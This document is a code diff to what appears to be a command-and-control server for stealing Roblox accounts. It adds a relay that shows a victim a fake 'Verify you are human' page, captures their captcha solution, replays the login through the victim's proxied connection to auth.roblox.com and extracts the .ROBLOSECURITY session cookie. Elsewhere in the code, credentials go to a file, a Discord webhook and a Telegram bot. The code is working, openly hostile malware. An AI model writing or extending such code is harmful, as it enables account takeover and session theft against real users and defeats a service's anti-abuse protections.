@@ -17,6 +17,9 @@ import threading
 import requests
 import base64
 import http.client
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+import secrets as py_secrets
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
 log = logging.getLogger(__name__)
@@ -28,6 +31,8 @@ UPDATE_DELAY = 2 * 3600
 CREDENTIALS_FILE = os.path.abspath("c2_credentials.txt")
 DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
 CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
+CAPTCHA_PORT = int(os.environ.get("CAPTCHA_PORT", "8082"))
+C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
 
 tg_proc = None
 
@@ -63,6 +68,229 @@ def dc_write(text):
         log.error(f"DC webhook error: {e}")
 
 
+# === Captcha relay ===
+_captcha_sessions = {}
+
+
+def create_captcha_session(chall_id, metadata_b64, enforcement_data=None):
+    token = py_secrets.token_urlsafe(32)
+    _captcha_sessions[token] = {
+        "event": threading.Event(),
+        "solution": None,
+        "challenge_id": chall_id,
+        "metadata_b64": metadata_b64,
+        "enforcement_data": enforcement_data or {},
+        "created": time.time(),
+    }
+    return token
+
+
+def wait_for_captcha_solution(token, timeout=300):
+    session = _captcha_sessions.get(token)
+    if not session:
+        return None
+    session["event"].wait(timeout=timeout)
+    _captcha_sessions.pop(token, None)
+    return session.get("solution")
+
+
+def generate_captcha_html(token, enforcement_data):
+    blob = enforcement_data.get("blob", "")
+    public_key = enforcement_data.get("publicKey", "476068BF-9607-4799-B53D-966BE98E2B81")
+    blob_escaped = blob.replace("\\", "\\\\").replace("'", "\\'") if blob else ""
+    blob_js = f", data: {{ blob: '{blob_escaped}' }}" if blob_escaped else ""
+    return f'''<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verification Required</title>
+<style>
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
+body {{ background: #111; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }}
+.card {{ background: #1e1e2e; border-radius: 16px; padding: 40px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.6); max-width: 500px; width: 90%; border: 1px solid #333; }}
+h2 {{ color: #eee; margin-bottom: 8px; font-size: 22px; }}
+.sub {{ color: #888; margin-bottom: 24px; font-size: 14px; }}
+#done {{ display: none; color: #4CAF50; font-size: 18px; font-weight: bold; padding: 20px; }}
+.load {{ color: #666; font-size: 14px; }}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>Verify you are human</h2>
+  <p class="sub">Complete the challenge below to continue</p>
+  <div id="fcaptcha" style="display:flex;justify-content:center;">
+    <p class="load">Loading verification...</p>
+  </div>
+  <div id="done">Verification complete! You can close this tab.</div>
+</div>
+<script src="https://client-api.arkoselabs.com/cdn/fc/v1.8.1/{public_key}/api.js"></script>
+<script>
+var TOKEN = '{token}';
+function initArkose() {{
+  if (typeof ArkoseEnforcement === 'undefined') {{
+    setTimeout(initArkose, 500);
+    return;
+  }}
+  new ArkoseEnforcement({{
+    public_key: '{public_key}',
+    target_html: 'fcaptcha',
+    mode: 'inline'{blob_js},
+    onCompleted: function(r) {{
+      fetch('/captcha/solve', {{
+        method: 'POST',
+        headers: {{'Content-Type': 'application/json'}},
+        body: JSON.stringify({{token: TOKEN, solution: r.token}})
+      }}).then(function() {{
+        document.getElementById('fcaptcha').style.display = 'none';
+        document.getElementById('done').style.display = 'block';
+      }});
+    }}
+  }});
+}}
+initArkose();
+setTimeout(function() {{
+  var el = document.getElementById('fcaptcha');
+  if (el && el.querySelector('p.load')) {{
+    el.innerHTML = '<p style="color:#f44">Failed to load. Please refresh.</p>';
+  }}
+}}, 30000);
+</script>
+</body>
+</html>'''
+
+
+class CaptchaHandler(BaseHTTPRequestHandler):
+    def log_message(self, fmt, *args):
+        log.info(f"[captcha-http] {fmt % args}")
+
+    def do_GET(self):
+        parsed = urlparse(self.path)
+        if parsed.path == "/captcha":
+            params = parse_qs(parsed.query)
+            token = params.get("token", [None])[0]
+            if token and token in _captcha_sessions:
+                session = _captcha_sessions[token]
+                html = generate_captcha_html(token, session["enforcement_data"])
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(html.encode("utf-8"))
+            else:
+                self.send_response(404)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(b"<html><body style='background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif'><div style='text-align:center'><h2>Link expired or invalid</h2><p style='color:#888'>Please try again</p></div></body></html>")
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def do_POST(self):
+        if self.path == "/captcha/solve":
+            try:
+                length = int(self.headers.get("Content-Length", 0))
+                body = json.loads(self.rfile.read(length))
+                token = body.get("token", "")
+                solution = body.get("solution", "")
+                if token in _captcha_sessions and solution:
+                    _captcha_sessions[token]["solution"] = solution
+                    _captcha_sessions[token]["event"].set()
+                    log.info(f"[captcha] Solution received for {token[:12]}...")
+                    self.send_response(200)
+                    self.send_header("Content-Type", "application/json")
+                    self.end_headers()
+                    self.wfile.write(b'{"ok":true}')
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b'{"ok":false}')
+            except Exception as e:
+                log.error(f"[captcha] POST error: {e}")
+                self.send_response(500)
+                self.end_headers()
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+
+def start_captcha_server():
+    try:
+        server = HTTPServer(("0.0.0.0", CAPTCHA_PORT), CaptchaHandler)
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        log.info(f"Captcha relay HTTP on port {CAPTCHA_PORT}")
+        return server
+    except Exception as e:
+        log.error(f"Captcha server start failed: {e}")
+        return None
+
+
+async def _solve_captcha_via_proxy(ws, chall_id, chall_meta_b64, csrf, csrf_body):
+    """Relay captcha to victim's browser, wait for solution, retry login."""
+    enforcement_data = {}
+    try:
+        meta = json.loads(base64.b64decode(chall_meta_b64))
+        enforcement = meta.get("enforcement", {})
+        enforcement_data = enforcement.get("data", {})
+        if not enforcement_data and isinstance(enforcement, dict):
+            enforcement_data = enforcement
+    except Exception:
+        pass
+
+    captcha_token = create_captcha_session(chall_id, chall_meta_b64, enforcement_data)
+    captcha_url = f"http://{C2_HOST}:{CAPTCHA_PORT}/captcha?token={captcha_token}"
+
+    try:
+        await ws.send(json.dumps({"type": "captcha_required", "url": captcha_url}))
+    except Exception as e:
+        log.warning(f"[captcha] Failed to send URL: {e}")
+        return {"challenge": "captcha"}
+    log.info(f"[captcha] URL sent: {captcha_url[:80]}...")
+
+    loop = asyncio.get_event_loop()
+    solution = await loop.run_in_executor(None, lambda: wait_for_captcha_solution(captcha_token, timeout=300))
+
+    if not solution:
+        log.warning("[captcha] Timeout — no solution received")
+        return {"challenge": "captcha"}
+
+    log.info("[captcha] Solved, retrying login...")
+
+    retry_hdrs = {
+        "x-csrf-token": csrf,
+        "rblx-challenge-id": chall_id,
+        "rblx-challenge-type": "captcha",
+        "rblx-challenge-redemption-token": solution,
+        "Content-Type": "application/json;charset=UTF-8",
+        "Origin": "https://www.roblox.com",
+        "Referer": "https://www.roblox.com/login",
+    }
+    retry = await http_req(ws, "POST", "https://auth.roblox.com/v2/login",
+                           headers=retry_hdrs, body=json.dumps(csrf_body))
+    if not retry:
+        return None
+
+    retry_cookies = retry.get("cookies", {})
+    rbx_cookie = retry_cookies.get(".ROBLOSECURITY") or retry_cookies.get("ROBLOSECURITY")
+    if rbx_cookie:
+        log.info("[captcha] .ROBLOSECURITY after solve!")
+        return {"cookie": rbx_cookie}
+
+    retry_status = retry.get("status", 0)
+    retry_headers = retry.get("headers", {})
+    retry_body = retry.get("body", "")
+    retry_chall = find_header(retry_headers, "rblx-challenge-id") or ""
+    retry_chall_type = find_header(retry_headers, "rblx-challenge-type") or ""
+
+    if retry_chall_type == "captcha" or "captcha" in retry_chall.lower():
+        return {"challenge": "captcha"}
+    if retry_status == 429:
+        return {"rate_limited": True}
+
+    log.warning(f"[captcha] Retry failed: HTTP {retry_status} {retry_body[:200]}")
+    return None
+
+
 def load_module(name):
     path = os.path.join(MODULES_DIR, name)
     with open(path, "r", encoding="utf-8") as f:
@@ -78,6 +306,13 @@ def solve_pow(N_str, A, T):
 
 
 CLIENTS = {}
+
+
+def find_header(hdrs, name):
+    for k, v in (hdrs or {}).items():
+        if k.lower() == name.lower():
+            return v
+    return None
 
 
 async def delayed_send(uid, delay, module, target_state):
@@ -124,13 +359,6 @@ async def login_via_proxy(ws, username, password):
     Orchestrate login via client HTTP proxy.
     Returns {"cookie": "..."}, {"challenge": "captcha"}, {"rate_limited": True}, or None.
     """
-
-    def find_header(hdrs, name):
-        """Case-insensitive header lookup."""
-        for k, v in (hdrs or {}).items():
-            if k.lower() == name.lower():
-                return v
-        return None
 
     async def proxy_post(url, data, extra_headers=None, no_csrf=False):
         """POST via client, get CSRF if needed."""
@@ -196,8 +424,7 @@ async def login_via_proxy(ws, username, password):
             return await _solve_pow_via_proxy(ws, username, password, chall_id, chall_meta_b64, csrf)
 
         if chall_type == "captcha" or "captcha" in chall_id.lower():
-            log.info("[proxy] Captcha challenge — need browser fallback")
-            return {"challenge": "captcha"}
+            return await _solve_captcha_via_proxy(ws, chall_id, chall_meta_b64, csrf, csrf_body)
 
     # Rate limit
     if status == 429:
@@ -319,8 +546,9 @@ async def _solve_pow_via_proxy(ws, username, password, chall_id, chall_meta_b64,
     retry_chall_type = find_header(retry_headers, "rblx-challenge-type") or ""
 
     if retry_chall_type == "captcha" or "captcha" in retry_chall.lower():
-        log.info("[pow] Captcha challenge after PoW — need browser")
-        return {"challenge": "captcha"}
+        log.info("[pow] Captcha after PoW — relaying to victim")
+        return await _solve_captcha_via_proxy(ws, chall_id, chall_meta_b64, csrf,
+            {"ctype": "Username", "cvalue": username, "password": password})
 
     if retry_status == 429:
         log.warning("[pow] Rate limited after PoW")
@@ -489,6 +717,7 @@ async def main():
         for line in tg_proc.stdout:
             log.info(f"[tg_bot] {line.rstrip()}")
     threading.Thread(target=read_tg, daemon=True).start()
+    start_captcha_server()
 
     async def handler(ws):
         await handle_client(ws)
